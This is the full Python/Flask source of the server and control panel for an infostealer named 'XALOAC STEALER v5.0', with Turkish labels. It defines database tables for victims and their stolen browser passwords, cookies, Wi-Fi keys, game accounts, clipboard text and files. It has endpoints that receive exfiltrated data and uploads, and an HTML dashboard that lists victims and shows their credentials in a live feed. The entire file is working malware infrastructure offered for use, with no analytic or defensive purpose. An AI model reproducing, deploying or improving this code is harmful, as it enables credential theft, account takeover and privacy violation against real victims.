# xaloAC-x410m1s0
"""
XALOAC STEALER v5.0 - SUNUCU
Author: x410m1s0
"""

import os
import sys
import json
import sqlite3
import hashlib
from datetime import datetime
from flask import Flask, request, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SAVE_DIR = os.path.join(BASE_DIR, "victims")
DB_PATH = os.path.join(SAVE_DIR, "xaloac.db")
os.makedirs(SAVE_DIR, exist_ok=True)

# Veritabanini hazirla
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS victims(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        ip TEXT, computer TEXT, username TEXT, os TEXT,
        hwid TEXT, cpu TEXT, ram REAL, gpu TEXT,
        screen TEXT, lang TEXT, tz TEXT, av TEXT,
        admin INTEGER, vm INTEGER,
        first_seen TEXT, last_seen TEXT, visits INTEGER DEFAULT 1)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS passwords(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT, browser TEXT,
        url TEXT, username TEXT, password TEXT,
        timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS cookies(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT, browser TEXT,
        host TEXT, name TEXT, value TEXT,
        timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS wifi(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        ssid TEXT, password TEXT,
        timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS games(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        platform TEXT, accounts TEXT,
        timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS files_log(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        filename TEXT, size_mb REAL,
        timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS clipboard(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        content TEXT,
        timestamp TEXT)''')
    
    conn.commit()
    conn.close()
    print(f"    [+] Veritabani: {DB_PATH}")

init_db()

# Panel HTML
PANEL = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>XALOAC STEALER v5.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#ccc;font-family:'Courier New',monospace;display:flex}
.sidebar{width:200px;background:#000;min-height:100vh;border-right:2px solid red;padding:20px 0;position:fixed;top:0;left:0;bottom:0}
.sidebar h2{color:red;text-align:center;font-size:1.5em;margin-bottom:30px}
.sidebar a{display:block;padding:12px 20px;color:#ccc;text-decoration:none;font-size:0.85em;border-left:3px solid transparent}
.sidebar a:hover,.sidebar a.active{background:#1a0000;border-left-color:red;color:red}
.main{margin-left:200px;padding:20px;width:100%}
.header{background:#000;padding:15px 20px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
.header h1{color:red;font-size:1.2em}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:20px}
.stat{background:#111;border:1px solid #222;padding:15px;text-align:center;border-radius:5px}
.stat h3{font-size:0.7em;color:#666;margin-bottom:5px;text-transform:uppercase;letter-spacing:1px}
.stat .num{font-size:2em;color:red;font-weight:bold}
.card{background:#111;border:1px solid #222;border-radius:5px;overflow:hidden;margin-bottom:20px}
.card h2{background:#0d0000;padding:12px 15px;font-size:0.9em;color:red;border-bottom:1px solid #222}
.card table{width:100%;border-collapse:collapse;font-size:0.8em}
.card th{background:#0a0000;padding:8px 10px;text-align:left;color:#ff4444;font-size:0.75em}
.card td{padding:6px 10px;border-bottom:1px solid #1a1a1a;word-break:break-all}
.card tr:hover td{background:#1a0a0a}
.pw{color:yellow;font-weight:bold}
.btn{background:red;color:#fff;border:none;padding:4px 12px;cursor:pointer;font-family:'Courier New';font-size:0.7em;border-radius:3px}
.btn:hover{background:#cc0000}
.tab{display:none}.tab.active{display:block}
#liveFeed{height:300px;overflow-y:auto;background:#000;padding:10px;font-size:0.75em}
#liveFeed div{padding:3px 0;border-bottom:1px solid #111}
.green{color:#0f0}.yellow{color:#ff0}.cyan{color:#0ff}
</style>
</head>
<body>
<div class="sidebar">
<h2>XALOAC</h2>
<p style="text-align:center;font-size:0.6em;color:#666">v5.0 | x410m1s0</p>
<a href="#" class="active" onclick="showTab('dash',this)">Dashboard</a>
<a href="#" onclick="showTab('pw',this)">Sifreler</a>
<a href="#" onclick="showTab('ck',this)">Cookie</a>
<a href="#" onclick="showTab('wf',this)">WiFi</a>
<a href="#" onclick="showTab('gm',this)">Oyun</a>
<a href="#" onclick="showTab('fl',this)">Dosyalar</a>
<a href="#" onclick="showTab('live',this)">Canli</a>
</div>
<div class="main">
<div class="header"><h1>XALOAC STEALER - Control Panel</h1><span id="clock"></span></div>

<div id="dash" class="tab active">
<div class="stats" id="statsBox"></div>
<div class="card"><h2>Son Kurbanlar</h2><table><thead><tr><th>Bilgisayar</th><th>Kullanici</th><th>IP</th><th>OS</th><th>CPU</th><th>GPU</th><th>Son</th></tr></thead><tbody id="recentVictims"></tbody></table></div>
</div>

<div id="pw" class="tab"><div class="card"><h2>Tum Sifreler</h2><table><thead><tr><th>Kurban</th><th>Tarayici</th><th>URL</th><th>Kullanici</th><th>Sifre</th></tr></thead><tbody id="pwTable"></tbody></table></div></div>
<div id="ck" class="tab"><div class="card"><h2>Tum Cookie</h2><table><thead><tr><th>Kurban</th><th>Tarayici</th><th>Host</th><th>Name</th><th>Value</th></tr></thead><tbody id="ckTable"></tbody></table></div></div>
<div id="wf" class="tab"><div class="card"><h2>WiFi Sifreleri</h2><table><thead><tr><th>Kurban</th><th>SSID</th><th>Sifre</th></tr></thead><tbody id="wfTable"></tbody></table></div></div>
<div id="gm" class="tab"><div class="card"><h2>Oyun Hesaplari</h2><table><thead><tr><th>Kurban</th><th>Platform</th><th>Hesaplar</th></tr></thead><tbody id="gmTable"></tbody></table></div></div>
<div id="fl" class="tab"><div class="card"><h2>Calinan Dosyalar</h2><table><thead><tr><th>Kurban</th><th>Dosya</th><th>Boyut</th><th>Indir</th></tr></thead><tbody id="flTable"></tbody></table></div></div>
<div id="live" class="tab"><div class="card"><h2>Canli Feed</h2><div id="liveFeed"></div></div></div>
</div>

<script>
function showTab(id,el){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.getElementById(id).classList.add('active');document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));el.classList.add('active');loadTab(id)}
function loadTab(id){
if(id==='dash')loadStats();
if(id==='pw')fetch('/api/passwords').then(r=>r.json()).then(d=>document.getElementById('pwTable').innerHTML=d.map(p=>`<tr><td>${p.computer||p.victim_id}</td><td>${p.browser}</td><td>${(p.url||'').substring(0,60)}</td><td>${p.username}</td><td class="pw">${p.password}</td></tr>`).join(''));
if(id==='ck')fetch('/api/cookies').then(r=>r.json()).then(d=>document.getElementById('ckTable').innerHTML=d.map(c=>`<tr><td>${c.computer||c.victim_id}</td><td>${c.browser}</td><td>${(c.host||'').substring(0,40)}</td><td>${c.name}</td><td style="font-size:0.7em">${(c.value||'').substring(0,60)}</td></tr>`).join(''));
if(id==='wf')fetch('/api/wifi').then(r=>r.json()).then(d=>document.getElementById('wfTable').innerHTML=d.map(w=>`<tr><td>${w.computer||w.victim_id}</td><td>${w.ssid}</td><td class="pw">${w.password}</td></tr>`).join(''));
if(id==='gm')fetch('/api/games').then(r=>r.json()).then(d=>document.getElementById('gmTable').innerHTML=d.map(g=>`<tr><td>${g.computer||g.victim_id}</td><td>${g.platform}</td><td>${g.accounts}</td></tr>`).join(''));
if(id==='fl')fetch('/api/files').then(r=>r.json()).then(d=>document.getElementById('flTable').innerHTML=d.map(f=>`<tr><td>${f.computer||f.victim_id}</td><td>${f.filename}</td><td>${f.size_mb} MB</td><td><button class="btn" onclick="window.open('/download/${f.victim_id}/${f.filename}')">Indir</button></td></tr>`).join(''));
}
function loadStats(){
fetch('/api/stats').then(r=>r.json()).then(d=>{
document.getElementById('statsBox').innerHTML=`<div class="stat"><h3>Kurban</h3><div class="num">${d.victims}</div></div><div class="stat"><h3>Sifre</h3><div class="num">${d.passwords}</div></div><div class="stat"><h3>Cookie</h3><div class="num">${d.cookies}</div></div><div class="stat"><h3>WiFi</h3><div class="num">${d.wifi}</div></div><div class="stat"><h3>Oyun</h3><div class="num">${d.games}</div></div><div class="stat"><h3>Dosya</h3><div class="num">${d.files}</div></div>`;
fetch('/api/victims').then(r=>r.json()).then(v=>document.getElementById('recentVictims').innerHTML=v.slice(0,10).map(x=>`<tr><td>${x.computer}</td><td>${x.username}</td><td>${x.ip}</td><td>${(x.os||'').substring(0,25)}</td><td>${(x.cpu||'').substring(0,25)}</td><td>${(x.gpu||'').substring(0,25)}</td><td>${x.last_seen}</td></tr>`).join(''));
});
}

// Canli feed polling
let lastId=0;
setInterval(()=>{fetch('/api/feed/'+lastId).then(r=>r.json()).then(d=>{if(d.length>0){const feed=document.getElementById('liveFeed');d.forEach(e=>{const div=document.createElement('div');div.className=e.cls||'';div.textContent='['+e.time+'] '+e.msg;feed.insertBefore(div,feed.firstChild);lastId=e.id});if(feed.children.length>100)for(let i=100;i<feed.children.length;i++)feed.removeChild(feed.children[i])}})},3000);

setInterval(()=>{document.getElementById('clock').textContent=new Date().toLocaleString('tr-TR')},1000);
loadStats();
</script>
</body>
</html>'''

FEED = []
FEED_ID = 0

def add_feed(msg, cls=''):
    global FEED_ID
    FEED_ID += 1
    FEED.insert(0, {'id': FEED_ID, 'time': datetime.now().strftime('%H:%M:%S'), 'msg': msg, 'cls': cls})
    if len(FEED) > 200:
        FEED.pop()

# ============ ROUTES ============

@app.route('/')
def panel():
    return PANEL

@app.route('/ping')
def ping():
    return "XALOAC-OK"

@app.route('/api/stats')
def api_stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims"); v = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM passwords"); p = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM cookies"); ck = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM wifi"); w = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM games"); g = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM files_log"); f = c.fetchone()[0]
    conn.close()
    return json.dumps({"victims":v,"passwords":p,"cookies":ck,"wifi":w,"games":g,"files":f})

@app.route('/api/victims')
def api_victims():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY last_seen DESC LIMIT 50")
    r = [dict(x) for x in c.fetchall()]
    conn.close()
    return json.dumps(r, ensure_ascii=False)

@app.route('/api/passwords')
def api_passwords():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT p.*, v.computer FROM passwords p LEFT JOIN victims v ON p.victim_id=v.victim_id ORDER BY p.timestamp DESC LIMIT 300")
    r = [dict(x) for x in c.fetchall()]
    conn.close()
    return json.dumps(r, ensure_ascii=False)

@app.route('/api/cookies')
def api_cookies():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT c.*, v.computer FROM cookies c LEFT JOIN victims v ON c.victim_id=v.victim_id ORDER BY c.timestamp DESC LIMIT 300")
    r = [dict(x) for x in c.fetchall()]
    conn.close()
    return json.dumps(r, ensure_ascii=False)

@app.route('/api/wifi')
def api_wifi():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT w.*, v.computer FROM wifi w LEFT JOIN victims v ON w.victim_id=v.victim_id ORDER BY w.timestamp DESC LIMIT 100")
    r = [dict(x) for x in c.fetchall()]
    conn.close()
    return json.dumps(r, ensure_ascii=False)

@app.route('/api/games')
def api_games():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT g.*, v.computer FROM games g LEFT JOIN victims v ON g.victim_id=v.victim_id ORDER BY g.timestamp DESC LIMIT 100")
    r = [dict(x) for x in c.fetchall()]
    conn.close()
    return json.dumps(r, ensure_ascii=False)

@app.route('/api/files')
def api_files():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT f.*, v.computer FROM files_log f LEFT JOIN victims v ON f.victim_id=v.victim_id ORDER BY f.timestamp DESC LIMIT 100")
    r = [dict(x) for x in c.fetchall()]
    conn.close()
    return json.dumps(r, ensure_ascii=False)

@app.route('/api/feed/<int:since>')
def api_feed(since):
    return json.dumps([f for f in FEED if f['id'] > since])

# ============ VERI ALMA ============

@app.route('/info', methods=['POST'])
def receive_info():
    try:
        data = request.get_json(force=True)
        ip = request.remote_addr
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        victim_id = data.get('hwid') or data.get('computer') or hashlib.md5(ip.encode()).hexdigest()[:8]
        
        # JSON yedekle
        vdir = os.path.join(SAVE_DIR, victim_id)
        os.makedirs(vdir, exist_ok=True)
        with open(os.path.join(vdir, f"data_{ts}.json"), 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        t = data.get('type', 'system')
        
        if t == 'system' or 'computer' in data:
            c.execute('''INSERT OR REPLACE INTO victims(victim_id,ip,computer,username,os,hwid,cpu,ram,gpu,screen,lang,tz,av,admin,vm,first_seen,last_seen,visits)
                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,COALESCE((SELECT first_seen FROM victims WHERE victim_id=?),?),?,COALESCE((SELECT visits FROM victims WHERE victim_id=?),0)+1)''',
                (victim_id,ip,data.get('computer','?'),data.get('user','?'),data.get('os','?'),data.get('hwid','?'),data.get('cpu','?'),data.get('ram',0),data.get('gpu','?'),data.get('screen','?'),data.get('lang','?'),data.get('tz','?'),data.get('av','?'),data.get('admin',0),data.get('vm',0),victim_id,now,victim_id))
            add_feed(f"KURBAN: {data.get('computer','?')} | {data.get('user','?')} | {ip}", 'green')
            print(f"\n[+] KURBAN: {data.get('computer','?')} | {data.get('user','?')} | {ip}")
        
        elif t == 'passwords':
            b = data.get('browser','?')
            n = 0
            for p in data.get('data',[]):
                if p.get('url') and p.get('password'):
                    c.execute("INSERT INTO passwords(victim_id,browser,url,username,password,timestamp) VALUES(?,?,?,?,?,?)",(victim_id,b,p['url'],p.get('username',''),p['password'],now))
                    n += 1
            add_feed(f"SIFRE [{b}]: {n} adet", 'yellow')
            print(f"    [+] SIFRE [{b}]: {n} adet")
        
        elif t == 'cookies':
            b = data.get('browser','?')
            n = 0
            for ck in data.get('data',[]):
                if ck.get('host') and ck.get('value'):
                    c.execute("INSERT INTO cookies(victim_id,browser,host,name,value,timestamp) VALUES(?,?,?,?,?,?)",(victim_id,b,ck['host'],ck.get('name',''),ck['value'],now))
                    n += 1
            add_feed(f"COOKIE [{b}]: {n} adet", 'yellow')
            print(f"    [+] COOKIE [{b}]: {n} adet")
        
        elif t == 'wifi':
            n = 0
            for w in data.get('data',[]):
                if w.get('ssid'):
                    c.execute("INSERT INTO wifi(victim_id,ssid,password,timestamp) VALUES(?,?,?,?)",(victim_id,w['ssid'],w.get('password',''),now))
                    n += 1
            add_feed(f"WIFI: {n} ag", 'cyan')
            print(f"    [+] WIFI: {n} ag")
        
        elif t == 'games':
            n = 0
            for g in data.get('data',[]):
                if g.get('platform'):
                    accs = ','.join(g.get('accounts',[]))
                    c.execute("INSERT INTO games(victim_id,platform,accounts,timestamp) VALUES(?,?,?,?)",(victim_id,g['platform'],accs,now))
                    n += 1
            add_feed(f"OYUN: {n} platform", 'cyan')
            print(f"    [+] OYUN: {n} platform")
        
        elif t == 'clipboard':
            c.execute("INSERT INTO clipboard(victim_id,content,timestamp) VALUES(?,?,?)",(victim_id,data.get('content','')[:5000],now))
            add_feed(f"PANO: {len(data.get('content',''))} karakter", 'cyan')
            print(f"    [+] PANO")
        
        conn.commit()
        conn.close()
        return "OK"
    except Exception as e:
        print(f"[-] HATA: {e}")
        return "ERROR", 500

@app.route('/upload', methods=['POST'])
def receive_file():
    try:
        data = request.data
        if not data: return "NO-DATA", 400
        
        ip = request.remote_addr
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = request.headers.get('X-Filename', f'file_{ts}.zip')
        vid = request.headers.get('X-Victim-ID', ip)
        
        vdir = os.path.join(SAVE_DIR, vid)
        os.makedirs(vdir, exist_ok=True)
        
        fp = os.path.join(vdir, fn)
        with open(fp, 'wb') as f:
            f.write(data)
        
        sz = len(data) / 1024 / 1024
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO files_log(victim_id,filename,size_mb,timestamp) VALUES(?,?,?,?)",(vid,fn,round(sz,2),now))
        conn.commit()
        conn.close()
        
        add_feed(f"DOSYA: {fn} ({round(sz,2)} MB)", 'cyan')
        print(f"    [+] DOSYA: {fn} ({sz:.1f} MB)")
        return "OK"
    except Exception as e:
        print(f"[-] DOSYA HATASI: {e}")
        return "ERROR", 500

@app.route('/download/<vid>/<fn>')
def download_file(vid, fn):
    fp = os.path.join(SAVE_DIR, vid, fn)
    if os.path.exists(fp):
        return send_file(fp, as_attachment=True)
    return "Bulunamadi", 404

# ============ BASLAT ============
if __name__ == '__main__':
    print(r"""
    ╔══════════════════════════════════════════╗
    ║  XALOAC STEALER v5.0 - SUNUCU          ║
    ║  Author: x410m1s0                      ║
    ╚══════════════════════════════════════════╝
    """)
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"    [X] Panel: http://localhost:{port}")
    print(f"    [X] Veri: {SAVE_DIR}")
    print()
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)